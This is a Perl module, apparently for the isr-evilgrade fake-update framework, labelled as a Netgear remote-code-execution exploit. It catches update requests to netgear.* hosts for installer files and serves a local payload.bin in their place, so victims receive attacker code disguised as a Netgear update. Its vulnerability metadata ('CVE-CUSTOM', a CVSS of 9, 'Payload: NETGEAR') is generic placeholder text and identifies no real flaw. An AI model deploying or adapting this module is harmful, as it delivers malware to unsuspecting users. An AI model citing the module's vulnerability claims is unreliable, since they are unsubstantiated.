###############
# netgear_rce.pm
#
# CVE-CUSTOM: RCE Vulnerability
# Type: RCE
# CVSS: 9
# Year: 2026
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.

package modules::netgear_rce;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'netgear_rce',
    'version'     => '1.0',
    'cvss'        => '9',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
Exploits CVE-CUSTOM: RCE vulnerability.
CVSS Score: 9
Vector: RCE
Year Disclosed: 2026
Payload: NETGEAR
    },
    'vh' => 'netgear.*',
    'request' => [
        {
            'req'   => '/.*\\.exe|\\.msi|\\.pkg|\\.deb|\\.rpm',
            'type'  => 'file',
            'file'  => './include/netgear_rce/payload.bin',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/octet-stream\r\n"
                . "Content-Disposition: attachment; filename=NETGEAR\r\n"
                . "Connection: close\r\n\r\n",
        },
    ],
};

sub new {
    my $class = shift;
    my $self = $base;
    bless( $self, $class );
    return $self;
}

1;
